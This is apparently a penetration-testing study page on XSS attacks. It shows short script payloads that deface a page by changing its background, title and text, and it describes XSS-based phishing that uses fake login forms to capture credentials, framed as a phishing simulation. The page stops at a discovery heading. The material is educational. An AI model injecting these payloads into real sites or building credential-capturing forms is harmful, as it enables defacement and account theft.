# XSS Attacks

### Defacing

After we successfully discover a XSS vulnerability, we might want exploit it and inject JavaScript code through XSS and make a web page look any way we like.

There are some common HTML elements usually utilized to change the original look of a web page:

* Background Color <mark style="color:purple;">document.body.style.background</mark>
* Background <mark style="color:purple;">document.body.background</mark>
* Page Title <mark style="color:purple;">document.title</mark>
* Page Text <mark style="color:purple;">DOM.innerHTML</mark>

#### Changing the Background

```html
<script>document.body.style.background = "black"</script>
```

{% code overflow="wrap" %}
```html
<script>document.body.background = "https://www.example.com/images/logo.svg"</script>
```
{% endcode %}

#### Changing Page Title

```html
<script>document.title = 'Example Site'</script>
```

#### Changing Page Text

It is possible to change the text of a specific HTML element/DOM using <mark style="color:purple;">innerHTML</mark> function:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

### Phishing

A common type of XSS attack is phishing. In these attacks, scammers use fake but convincing information to trick people into giving away their sensitive information. One way this happens is by creating fake login forms that capture users' login details and send them to the attacker. The attacker can then use this information to access the victim's account.

If we find an XSS vulnerability in a web application for a specific organization, we can use it to run a phishing simulation. This exercise helps us see how aware the organization's employees are about security, especially if they trust the vulnerable web application and don’t think it could be harmful.



#### XSS Discovery

